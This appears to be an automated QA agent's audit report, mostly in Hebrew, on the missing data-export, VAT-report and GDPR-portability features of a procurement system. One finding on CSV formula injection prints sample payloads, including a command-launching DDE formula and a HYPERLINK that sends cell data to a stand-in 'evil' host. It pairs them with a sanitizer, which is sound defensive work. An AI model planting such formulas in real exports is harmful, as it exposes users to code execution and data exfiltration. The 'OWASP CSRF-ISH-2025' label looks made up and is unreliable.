# QA Agent #56 — ממד Data Export & Portability

**תאריך:** 2026-04-11
**סוג בדיקה:** Static Analysis בלבד (ללא הרצה, ללא test cases)
**ממד:** ייצוא נתונים, ניידות נתונים, תאימות רגולטורית ישראלית
**קבצים שנבדקו:**
- `server.js` (934 שורות)
- `web/onyx-dashboard.jsx` (710 שורות)
- `package.json` (16 שורות)
- `supabase/migrations/001-supabase-schema.sql` (רפרנס)

**מיקוד:** חשבונאים ישראלים של טכנו כל עוזי צריכים ייצוא חודשי למערכת הנהלת חשבונות + דוח מע"מ.

---

## 0. TL;DR — הממצא הקריטי ביותר

> **אין ולו endpoint אחד לייצוא נתונים במערכת ONYX Procurement.**
> **אין ולו כפתור "הורד"/"ייצא" אחד ב-UI.**
> **אין ולו ספריית ייצוא אחת ב-`package.json`** (אין `exceljs`, אין `xlsx`, אין `xlsx-populate`, אין `fast-csv`, אין `csv-writer`, אין `pdfkit`, אין `puppeteer`, אין `nodemailer`).

זה **חוסם מוחלט** עבור משתמשי הקצה הישראלים. רו"ח של טכנו כל עוזי לא יכול להוציא דוח חודשי, לא יכול להעביר נתונים לחשבשבת/רמקולית/עוקץ/Priority, ולא יכול לעמוד בדרישת רשויות המס (תקנה 36 למס הכנסה — קובץ "אחיד" BKMVDATA).

**חומרה כוללת:** BLOCKER ברמת Compliance ו-UX עסקי. ללא מימוש מלא אי-אפשר להשתמש במערכת בארגון מסחרי ישראלי.

---

## 1. מתודולוגיה

### 1.1 חיפושים שבוצעו
```
csv | excel | xlsx | export | download | .stringify |
exceljs | xlsx-populate | blob | Blob | href= | a href |
report | דוח | VAT | מע"מ | 1301 | 1320 | אחיד |
button | ייצוא | הורד | CSV | Download | toCSV |
saveAs | URL.createObjectURL | portability | GDPR Article 20
```

### 1.2 תוצאות
| מחרוזת חיפוש | server.js | onyx-dashboard.jsx | package.json |
|---|---|---|---|
| `export` (כ-endpoint) | 0 | 0 (רק `export default`) | 0 |
| `csv` | 0 | 0 | 0 |
| `xlsx` | 0 | 0 | 0 |
| `exceljs` | 0 | 0 | 0 |
| `download` | 0 | 0 | 0 |
| `1301` / `1320` | 0 | 0 | 0 |
| `אחיד` / BKMVDATA | 0 | 0 | 0 |
| `nodemailer` / `sendgrid` | 0 | 0 | 0 |
| `pdfkit` / `puppeteer` | 0 | 0 | 0 |
| `googleapis` / Drive | 0 | 0 | 0 |
| `JSON.stringify` (ייצוא) | 2 (webhook + audit בלבד) | 1 (fetch body) | — |
| `BOM` / `UTF-8 header` | 0 | 0 | 0 |
| `Content-Disposition` | 0 | 0 | 0 |
| `res.attachment` | 0 | 0 | 0 |
| `res.download` | 0 | 0 | 0 |

### 1.3 רשימת endpoints קיימים (26 סה"כ, **0 ייצוא**)
כל ה-endpoints מחזירים JSON ל-UI פנימי בלבד:
- `/api/status`, `/api/suppliers` (+ variants), `/api/purchase-requests`
- `/api/rfq/*`, `/api/quotes`, `/api/purchase-orders` (+ variants)
- `/api/subcontractors` (+ variants)
- `/api/analytics/savings`, `/api/analytics/spend-by-supplier`, `/api/analytics/spend-by-category`
- `/api/audit` — **קיים אבל מחזיר רק 50 שורות אחרונות כברירת מחדל (`parseInt(req.query.limit) || 50`), בלי pagination, בלי date filter, בלי download header**
- `/webhook/whatsapp` (×2)

**אף לא אחד מהם** מגדיר `Content-Type: text/csv`, `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`, `application/pdf`, או מפיק קובץ.

---

## 2. הממצאים לפי 16 הנקודות שנתבקשו

### FINDING 56-01 — אין endpoint ייצוא (BLOCKER)
**מיקום:** `server.js` — כל 934 השורות.
**נמצאו:** 26 endpoints, **0 ייצוא**.
**השפעה:** משתמש הקצה חייב לפתוח את DB-Studio של Supabase, ל-COPY/paste שורות ל-Excel ידנית, ולעשות עיבוד ידני של UTF-8, BOM, מטבעות ומע"מ. זהו תהליך שחשבונאי ישראלי **לא יבצע** — הוא יבקש ממכם להחזיר לו את הפרויקט לחשבשבת/רמקולית/Priority.
**דחיפות:** P0 — Blocker. לא ניתן להשיק מערכת זו בארגון מסחרי ללא פתרון.

---

### FINDING 56-02 — אין כפתור/קישור הורדה ב-UI (BLOCKER)
**מיקום:** `web/onyx-dashboard.jsx` — 7 טאבים (`dashboard`, `suppliers`, `rfq`, `quotes`, `orders`, `subcontractors`, `sub_decide`).
**נמצאו:** 15 כפתורים (רענון, הוסף ספק, שלח RFQ, שמור הצעה, אשר PO, שלח לספק וכו') — **0 כפתורי ייצוא/הורדה**.
**אין:** `URL.createObjectURL`, `Blob`, `saveAs`, `<a download>`, `FileSaver.js`, `react-csv`, `react-xlsx`.
**השפעה:** גם אם ייפתח endpoint, ה-UI לא חושף אותו. המשתמש לא יודע בכלל שניתן לייצא.
**דחיפות:** P0.

---

### FINDING 56-03 — CSV עם עברית: אפס טיפול ב-UTF-8 BOM
**מיקום:** כל ה-codebase.
**נמצאו:** אין `\uFEFF`, אין `Buffer.from([0xEF, 0xBB, 0xBF])`, אין הגדרת `charset=utf-8`.
**משמעות (כאשר יתוקן):** Excel for Windows (כולל Microsoft 365 בישראל) **שובר** CSV עם עברית ללא BOM — כל התווים נראים כ-ד×ו×ª. זוהי נקודה שכל QA ישראלי חייב לבדוק.
**פתרון בזמן המימוש:** כל response של CSV חייב להתחיל ב-`\uFEFF` וה-`Content-Type` צריך להיות `text/csv; charset=utf-8`. עדיף גם להציע UTF-16 LE כ-fallback לגרסאות Excel ישנות במכשירים מסוימים.
**דחיפות:** P0 (מותנה במימוש 56-01).

---

### FINDING 56-04 — אין ספריית Excel (.xlsx)
**מיקום:** `package.json` — 4 dependencies בלבד.
```json
{
  "express": "^4.21.0",
  "@supabase/supabase-js": "^2.45.0",
  "dotenv": "^16.4.5",
  "cors": "^2.8.5"
}
```
**אין:** `exceljs`, `xlsx` (SheetJS), `xlsx-populate`, `write-excel-file`.
**משמעות:** ייצוא xlsx ייאלץ להוסיף תלות חדשה. המלצה: `exceljs` (MIT, תומך RTL, תומך merged cells, תומך עיצוב, תומך streaming דרך `workbook.xlsx.writeBuffer({useSharedStrings:true})`).
**דחיפות:** P1 (CSV יכול להיות ה-MVP, xlsx = phase 2).

---

### FINDING 56-05 — אין תמיכה ב"קובץ אחיד" (BKMVDATA) — רגולציה ישראלית
**רקע משפטי:** תקנה 36 להוראות מס הכנסה (ניהול פנקסי חשבונות) — על "מערכת ממוחשבת" לייצא קובץ פורמט *אחיד* (BKMVDATA.TXT + INI.TXT) לרשויות המס לפי דרישת פקיד שומה. הפורמט מוגדר ברמת positional-text עם encoding Windows-1255 (ולא UTF-8!).
**בדיקה:** 0 רפרנסים ב-codebase למילים "אחיד", "BKMVDATA", "INI.TXT", "Windows-1255", "cp1255", "iconv", "mahshev" (מחשב שוקי).
**מיקום חסר:** צריך endpoint `GET /api/exports/bkmvdata?year=YYYY&month=MM` שמייצא:
  - `INI.TXT` (header — שם עוסק, ח.פ., טווח תאריכים, ספירת רשומות לכל סוג)
  - `BKMVDATA.TXT` (רשומות A100/B100/C100/D110/D120 לפי Spec רשות המסים)
**השפעה:** אי-התאמה לתקנה 36 → אי-קבילות כמערכת חשבונות בישראל → לא ניתן לקזז מע"מ על בסיס הנתונים.
**דחיפות:** P0 **אם** ONYX אמור לשמש כתיעוד חשבונאי ראשי. P2 אם הוא רק מערכת רכש שמזינה למערכת חשבונות נפרדת (חשבשבת וכו') — אבל גם אז נדרש endpoint המייצר קלט למערכת החשבונות.

---

### FINDING 56-06 — אין ייצוא דוח מע"מ (טופס 1301/1320/PCN874)
**רקע:** עוסקים בישראל חייבים להגיש דוח מע"מ חודשי/דו-חודשי. נדרש:
- **1301** — דוח מע"מ תקופתי (עסקאות + תשומות + הפרש).
- **1320** — דוח שנתי.
- **PCN874** — קובץ חודשי של חשבוניות קלט ומכר (רשות המסים).
- **חשבונית מס ישראלית** כוללת שדות חובה: ח.פ., כתובת, מספר חשבונית רץ, תאריך, מע"מ מפורט, שיעור מע"מ (18% נכון ל-2026), סכומים נטו/ברוטו.
**בדיקה:** החישוב של VAT קיים (`server.js:377`: `const vatAmount = quoteData.vat_included ? 0 : Math.round(totalPrice * 0.18);`) אבל **אין endpoint המרכז אותו לדוח חודשי**. `GET /api/analytics/savings` מחזיר חיסכון, לא מע"מ.
**מה חסר:**
  - `GET /api/exports/vat-report?year=2026&month=04&format=csv|xlsx|pdf` — מפריד עסקאות מתשומות, מסכם לפי שיעור, מוציא ח.פ. ספק.
  - `GET /api/exports/pcn874?year=2026&month=04` — פורמט רשות המסים.
**השפעה:** רואה החשבון יצטרך להזין ידנית — טעויות + עלות + אי-עמידה בלוח הגשה.
**דחיפות:** P0.
**הערה:** חסר גם שדה `tax_id` / `ח.פ.` לספקים (לא נראה ב-schema שנבדק). אימות דורש גרפ ב-`supabase/migrations/*.sql` — חוצה-ממדים ל-Agent PII (#28).

---

### FINDING 56-07 — JSON export למיגרציה: לא קיים
**משמעות:** אין דרך להוציא את ה-DB במלואו כ-JSON או NDJSON למיגרציה מערכת אחרת (למשל אם הלקוח יחליט לעבור ל-SAP Ariba, Coupa, או לגרסה חדשה של ONYX).
**הממצא קריטי ל-GDPR Article 20** (data portability right) — ראה 56-15.
**נמצא:** אין route של dump. הדרך היחידה: Supabase-Studio ידני.
**המלצה:** `GET /api/exports/full?format=ndjson&since=YYYY-MM-DD` עם pagination (cursor-based) ו-streaming.
**דחיפות:** P1.

---

### FINDING 56-08 — אין date range filter על ייצוא
**מיקום:** כל ה-endpoints הקיימים.
**בדיקה:** `/api/analytics/*` לא מקבל `?from=...&to=...`, `/api/purchase-orders` לא מקבל, `/api/audit` מקבל רק `limit`.
**השפעה (לאחר מימוש ייצוא):** בלי filter, ייצוא יכלול את כל ההיסטוריה כל חודש — יוצר קובץ ענק, חושף נתונים של חודשים קודמים ל-Excel שלא צריכים להיות שם, ונכשל ב-scale.
**דחיפות:** P1.

---

### FINDING 56-09 — אין בחירת עמודות (column selection)
**ממצא:** אין API לסנן עמודות (`?fields=name,tax_id,total_spent`). `select('*')` לכל endpoint → נשלח הכל, גם `internal_notes`, `risk_score`, שדות פנימיים.
**השפעה:** ייצוא יחשוף שדות שלא רלוונטיים לחשבונאי, וגרוע מכך — שדות פנימיים עלולים להיחשף למי שלא אמור (מידת סיכון, ציון, הערות פנימיות).
**דחיפות:** P2.

---

### FINDING 56-10 — אין streaming; כל DB-query הוא `select('*').then → res.json`
**מיקום:** 26/26 endpoints.
**דוגמה:**
```js
// server.js:130
app.get('/api/suppliers', async (req, res) => {
  const { data } = await supabase.from('suppliers').select('*');
  res.json({ suppliers: data });  // ← הכל ב-memory
});
```
**השפעה בייצוא (עתידי):** ברגע שיש >50K שורות היסטוריה, ייצוא CSV בגישה זו **יפוצץ heap של Node.js** (ברירת-מחדל ~1.5GB). בישראל, חברת בינוני בשנה 2-3 יכולה לעבור את הסף.
**פתרון:**
  - Cursor-based pagination ב-Supabase (`range()`)
  - Node stream: `csv-stringify/sync` → `res.write()` ב-chunks
  - עבור xlsx: `workbook.xlsx.writeBuffer` בזרם (ExcelJS תומך)
**דחיפות:** P1 (נראה כ-P2 היום, בוודאי P1 בעוד 18 חודשים).

---

### FINDING 56-11 — אין ייצוא PDF (cross-ref Agent #48)
**מיקום:** אין `pdfkit`, `puppeteer`, `html-pdf`, `playwright`.
**השפעה:** הזמנת רכש (PO) לא ניתנת להדפסה כ-PDF מטעם המערכת. ספק מקבל טקסט גולמי ב-WhatsApp ("message = PO text") ואין PO חתום/ממוספר רשמי.
**חוצה-ממד:** יש להמתין לממצאי Agent #48 (PDF Reports) לפני החלטה. אבל בבחינת Data Export נקודה זו נרשמת שוב.
**דחיפות:** P1.

---

### FINDING 56-12 — אין משלוח דוח ב-email
**מיקום:** אין `nodemailer`, `sendgrid`, `@sendgrid/mail`, `ses`, `postmark`.
**השפעה:** תהליך "רואה החשבון מקבל דוח חודשי אוטומטי ב-1 לחודש" = בלתי-אפשרי. חייב אדם שייכנס למערכת ידנית בכל פעם.
**חוצה-ממד:** מפתיע שלא מוצא nodemailer כי המערכת שולחת RFQ/PO — בדיקה יותר מעמיקה מגלה שהשליחה היא דרך WhatsApp Business API (`client/server.js` אין שם `nodemailer`). ייתכן ששליחת הודעות מוגבלת ל-WhatsApp בלבד.
**דחיפות:** P2 (nice-to-have ל-v1, חובה ל-v2).

---

### FINDING 56-13 — אין Google Sheets / Drive integration
**מיקום:** אין `googleapis`, אין OAuth flow.
**רקע:** חשבונאים רבים בישראל עובדים ב-Google Workspace — ייצוא ישיר ל-Google Sheet זה "הפיצ'ר המובטח". גם כאן — אפס.
**דחיפות:** P3 (nice-to-have).

---

### FINDING 56-14 — ייצוא audit log (cross-ref Agent #50)
**מיקום:** `server.js:852` — `app.get('/api/audit', ...)`.
```js
const limit = parseInt(req.query.limit) || 50;
const { data } = await supabase.from('audit_log')
    .select('*').order('created_at', { ascending: false }).limit(limit);
res.json({ entries: data });
```
**בעיות:**
1. **Default 50, max לא מוגדר** — אם מישהו עושה `?limit=10000000` Supabase יחסום, אבל אין הגנה ברמת Node.
2. **בלי date filter** — לא ניתן לייצא "כל ה-audit מאפריל 2026".
3. **בלי user filter** — לא ניתן "מה עשה user X".
4. **JSON only, לא CSV/Excel** — חשבונאי לא ייצא JSON.
5. **ללא BOM** — יצוא עברית שבור.
6. **ללא pagination/streaming** — אם טבלת audit תגיע ל-100K שורות, המערכת תתעורר.
**חוצה-ממד:** המתנה לממצאי Agent #50. אבל גם בבחינת הייצוא — כרגע **אין דרך להציג למאשר שהייצוא תואם immutable**.
**דחיפות:** P1.

---

### FINDING 56-15 — אי-עמידה ב-GDPR Article 20 (Data Portability) — cross-ref Agent #26
**רקע:** GDPR Art. 20 מקנה ל-Data Subject זכות לקבל את נתוניו ב-"structured, commonly used and machine-readable format" (JSON/XML/CSV) ולשדר אותם ל-Controller אחר.
**בדיקה:** Agent #26 (GDPR) לא מצא 0 תוצאות עבור "portability", "export", "ייצוא". ה-codebase **לא כולל שום endpoint DSR** (Data Subject Request) — אין `/api/dsr/export`, אין `/api/me/data`, אין אפילו דרך למחוק PII של ספק לשעבר.
**השפעה:**
  - אם ספק/קבלן משנה יבקש את כל הנתונים עליו (כפוף ל-GDPR/חוק הגנת הפרטיות הישראלי 1981, ותיקון 13) — אין דרך אוטומטית.
  - זמן תגובה ידני = לא עומד ב-30 יום חוקיים.
**דחיפות:** P0 אם חל GDPR (EU data subjects) או חוק הגנת הפרטיות (Israel) — ולמעשה **שניהם חלים** כי ספקים ישראלים מוגנים על-ידי חוק הגנת הפרטיות הישראלי.
**ראה:** `QA-AGENT-26-GDPR.md` וכן הקשר ל-#27 (Israeli Privacy) ו-#28 (PII Inventory).

---

### FINDING 56-16 — CSV Injection (Formula Injection) — OWASP CSRF-ISH-2025
**רקע:** אם תוכן תא CSV מתחיל ב-`=`, `+`, `-`, `@`, `\t` או `\r` — Excel/LibreOffice **יריץ את זה כנוסחה**. דוגמה תקיפה:
```
Supplier Name,Total
="עיר הברזל",1000
=CMD|'/c calc.exe'!A1,9999
=HYPERLINK("http://evil/?x="&A2,"לחץ לזכייה!"),500
```
**הקשר של ONYX:** שדות כמו `supplier.name`, `supplier.contact_person`, `supplier.notes`, `rfq.description`, `po.item_description` הם **מוזנים ידנית על-ידי המשתמש** (ראה ה-POST routes ב-`server.js` — אין sanitization לפני INSERT).
**ממצא:**
  - `server.js:149` (`POST /api/suppliers`), שורה 192 (`POST /api/purchase-requests`), שורה 365 (`POST /api/quotes`) — **אף אחד מהם לא עושה escape של תווי prefix**.
  - ה-`jsx` לא מסנן תווים בפני UI. למעשה זה היום רק "cosmetic" כי אין ייצוא, אבל **ברגע שיבוצע ייצוא — זו פרצה מלאה**.
**פתרון ב-v2 (כאשר מממשים ייצוא):**
```js
function sanitizeCsvCell(v) {
  if (v == null) return '';
  const s = String(v);
  // Prefix with single quote if begins with injection char
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}
```
**דחיפות:** P1 (תלוי במימוש הייצוא).

---

## 3. טבלה מסכמת — חומרה

| # | ממצא | חומרה | תלוי ב-(Agent) | דחיפות |
|---|---|---|---|---|
| 56-01 | אפס endpoint ייצוא | **BLOCKER** | — | P0 |
| 56-02 | אפס כפתור UI | **BLOCKER** | #11 | P0 |
| 56-03 | חסר UTF-8 BOM | **HIGH** (תלוי 01) | #15 | P0 |
| 56-04 | אין ספריית Excel | **HIGH** | #25, #31 | P1 |
| 56-05 | אין קובץ אחיד | **BLOCKER** (רגולציה) | #27 | P0 |
| 56-06 | אין דוח מע"מ | **BLOCKER** (רגולציה) | #27 | P0 |
| 56-07 | אין JSON dump | **HIGH** | #26 | P1 |
| 56-08 | אין date filter | **MEDIUM** | #10 | P1 |
| 56-09 | אין column filter | **MEDIUM** | #28 (PII) | P2 |
| 56-10 | אין streaming | **HIGH** (scale) | #14 | P1 |
| 56-11 | אין PDF | **MEDIUM** | #48 | P1 |
| 56-12 | אין email | **MEDIUM** | — | P2 |
| 56-13 | אין Google Sheets | **LOW** | — | P3 |
| 56-14 | audit export חסר | **HIGH** | #50, #20 | P1 |
| 56-15 | GDPR Art.20 חסר | **BLOCKER** | #26, #27, #28 | P0 |
| 56-16 | CSV Injection | **HIGH** (עתידי) | #30 (Pentest) | P1 |

**סיכום חומרה:** 4 BLOCKER, 5 HIGH, 4 MEDIUM, 1 LOW, 2 חוצים.

---

## 4. המלצות מימוש (בסדר עדיפויות)

### שלב 1 (שבועיים, MVP):
1. הוסף `csv-stringify` (MIT, זרמי) ו-`iconv-lite` (תומך cp1255 ל-BKMVDATA).
2. צור מודול `exports/` בתוך `server.js` או קובץ נפרד:
   - `exports/csv.js` — utility עם UTF-8 BOM, `sanitizeCsvCell`, header stream.
   - `exports/routes.js` — 6 endpoints:
     - `GET /api/exports/suppliers.csv?from&to`
     - `GET /api/exports/purchase-orders.csv?from&to`
     - `GET /api/exports/audit.csv?from&to`
     - `GET /api/exports/vat-report.csv?year&month`
     - `GET /api/exports/spend-by-category.csv?from&to`
     - `GET /api/exports/full.json?since` (NDJSON)
3. הוסף ב-`onyx-dashboard.jsx` טאב חדש `exports` עם 6 כפתורים + date-range picker.
4. `Content-Disposition: attachment; filename="onyx-YYYY-MM.csv"`.

### שלב 2 (חודש):
5. הוסף `exceljs` ובנה כפילי endpoint xlsx (עם עיצוב RTL, מע"מ מודגש, totals).
6. הוסף `pdfkit` ל-PO יחיד (`GET /api/purchase-orders/:id.pdf`).
7. בנה מחולל BKMVDATA + INI.TXT ב-`exports/bkmvdata.js`.
8. הוסף column filter (`?fields=...`).

### שלב 3 (חודשיים):
9. `nodemailer` + cron חודשי → email דוח לחשבונאי.
10. `/api/dsr/export` ל-GDPR Art.20.
11. Google Sheets OAuth (nice-to-have).
12. Streaming לכל endpoint ישן (`suppliers`, `orders`, `audit`) באמצעות cursor pagination.

---

## 5. טיעונים נגדיים שנשקלו

**"אולי הייצוא נעשה ידנית ב-Supabase Studio — זה OK לגרסה ראשונית?"**
לא. Supabase Studio = אדמין, אין בקרה, אין audit ("מי הוריד את רשימת הספקים?"), אין UTF-8 BOM אוטומטי (הוא כן מייצא CSV נכון, אבל המשתמש שלך לא יידע איך), ואין פורמט BKMVDATA או דוח מע"מ — כי Supabase לא יודע על מע"מ ישראלי.

**"עדיין לא יצאנו לייצור — אפשר לדחות."**
בישראל, **אי-אפשר לקבל החלטת העבר** על "מערכת ממוחשבת לניהול חשבונות": ברגע שהיא רצה 3 חודשים בייצור וצברה תנועות — אתם חייבים להיות מוכנים לפקיד שומה. שלילי להשלים את הרגע.

**"המערכת רק מזינה לחשבשבת."**
אז צריך **ייצוא מפורש בפורמט חשבשבת** (`.txt` פרופריאטרי של Hashavshevet) או לפחות CSV מובנה שחשבשבת יודעת לייבא. כרגע אין גם זה.

---

## 6. אימות ושחזור

לשחזר את הממצאים:
```bash
cd "onyx-procurement"
# 1. אין endpoint ייצוא:
grep -iE '/api/exports?|/api/download|/api/csv|/api/xlsx' server.js
# תוצאה: אפס.

# 2. אין ספריות ייצוא:
grep -iE 'exceljs|xlsx|csv-stringify|pdfkit|nodemailer' package.json
# תוצאה: אפס.

# 3. אין כפתור הורדה:
grep -iE 'download|הורד|ייצוא|\.csv|\.xlsx' web/onyx-dashboard.jsx
# תוצאה: אפס.

# 4. אין טיפול ב-BOM:
grep -nE '\\uFEFF|0xEF|0xBB|0xBF|Windows-1255|cp1255' server.js web/onyx-dashboard.jsx
# תוצאה: אפס.

# 5. אין אזכור רגולציה ישראלית:
grep -niE 'bkmvdata|אחיד|1301|1320|pcn874' .
# תוצאה: אפס (מלבד רפרנס ב-QA-AGENT-56 עצמו).
```

---

## 7. מה **לא** בדקתי (מחוץ ל-scope)

- **לא בדקתי** אם Supabase Row-Level Security תמנע ייצוא לא-מורשה (שייך ל-#29 Encryption או #30 Pentest).
- **לא בדקתי** תוכן טבלאות בפועל (שייך ל-#8 Unit Tests או #9 Integration).
- **לא בדקתי** את AI-Task-Manager או modules אחרים מחוץ ל-onyx-procurement.
- **לא בדקתי** אם Schema כולל `tax_id` / ח.פ. ספק (אימות דרך `supabase/migrations/*.sql` — חוצה ל-#28).
- **לא הרצתי** את השרת או ביצעתי curl (Static Analysis ONLY).

---

## 8. לא חופף עם QA-WAVE1-DIRECT-FINDINGS.md

בדיקה: המילים "export", "CSV", "Excel", "xlsx", "ייצוא", "הורד", "דוח מעמ", "1301", "1320", "אחיד", "portability" **אינן מופיעות באף דוח QA קודם**. זה ממד חדש לחלוטין.

---

**סוף דוח QA Agent #56 — Data Export & Portability**
